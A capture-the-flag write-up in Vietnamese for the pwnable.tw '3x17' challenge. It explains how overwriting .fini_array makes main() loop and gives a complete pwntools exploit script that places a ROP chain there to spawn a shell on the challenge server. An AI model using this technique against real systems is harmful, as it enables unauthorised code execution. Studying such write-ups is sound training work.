Challenge: 3x17

## Vấn đề
- [File challenge](https://pwnable.tw/challenge/#32)
- Chương trình thực thi như sau:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char *v4; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(40u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    write(1u, "addr:", 5uLL);
    read(0, buf, 24uLL);
    v4 = (char *)(int)sub_40EE70((__int64)buf);
    write(1u, "data:", 5uLL);
    read(0, v4, 24uLL);
    result = 0;
  }
  if ( __readfsqword(0x28u) != v6 )
    canary();
  return result;
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Partial RELRO
+ Stack:      No canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x400000)
```

## Giải pháp
- Chương trình cho phép user thay đổi data với địa chỉ mà user nhập nhưng vấn đề là làm sao để lấy shell.
- Thì tôi checksec ROPgadget thấy rằng có toàn bộ syscall, pop rax, pop rdi, pop rsi và pop rdx do đó có thể gắn execve("/bin/sh", 0, 0) để lấy shell. Nhưng vấn đề là chương trình chỉ cho phép chạy đúng 1 lần từ đó ta chỉ overwrite được có 1 địa chỉ thôi.
> Tìm cách chạy vòng lặp và gắn đủ execve("/bin/sh", 0, 0) sau đó kết thúc vòng lặp là sẽ có shell.

## Quá trình
- Thì để có thể tạo vòng lặp cho chương trình nó liên quan đến .fini_array mà qua bài [write up](https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/CODEGATE/pwnable/oldschool) đã giải thích. Nói tóm gọn là khi chương trình chạy xong hàm main() không phải là kết thúc ngay lặp tức mà nó sẽ thực thi tiếp libc_start_main() chứa hàm main(), sau khi hàm libc_start_main() chạy đến exit() cuối cùng chương trình sẽ thực thi .fini_array trong đó nó chứa các lệnh kết thúc chương trình. Một kiến thức ngoài lề là trước khi chạy hàm main() chương trình thực thi .init_array trong đó sẽ chứa các lệnh khai báo biến giúp chương trình có thể thực thi và sau đó mới chạy hàm main(). Từ đó, ta hiểu là chương trình thực thi không phải chạy xong mỗi main() là hết mà nó còn chạy các file khác nữa.
> Tận dụng .fini_array ta sẽ gắn địa chỉ main() vào .fini_array để khi main() vừa kết thúc chạy .fini_array nó sẽ thực thi lại hàm main() lần nữa.
- Khi đã tạo được vòng lặp vô tận của chương trình ta sẽ gắn lần lượt ROPgadget tạo thành execve("/bin/sh", 0, 0) và sau đó trả lại địa chỉ ret của main() nó sẽ thực thi execve("/bin/sh", 0, 0) và ta sẽ có shell.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('3x17', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x4B40F0

        ''')
        input()


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10105)
else:
    p = process([exe.path])
GDB()

def main_excute(addr, data):
    sa(b'addr:', str(addr))
    sa(b'data:', data)

syscall = 0x00000000004022b4
pop_rax = 0x000000000041e4af
pop_rdi = 0x0000000000401696
pop_rsi = 0x0000000000406c30
pop_rdx = 0x0000000000446e35
binsh_addr = 0x4b4000

fini_array = 0x00000000004b40f0
fini_array_excute = 0x402960
main_addr = 0x401B6D
ret_addr = 0x401C4B

main_excute(fini_array, p64(fini_array_excute) + p64(main_addr))
main_excute(binsh_addr, b'/bin/sh\x00')
main_excute(fini_array + 2*8, p64(pop_rdi) + p64(binsh_addr))
main_excute(fini_array + 4*8, p64(pop_rsi) + p64(0))
main_excute(fini_array + 6*8, p64(pop_rdx) + p64(0))
main_excute(fini_array + 8*8, p64(pop_rax) + p64(0x3b))
main_excute(fini_array + 10*8, p64(syscall) + p64(0))
main_excute(fini_array, p64(ret_addr))

p.interactive()
```
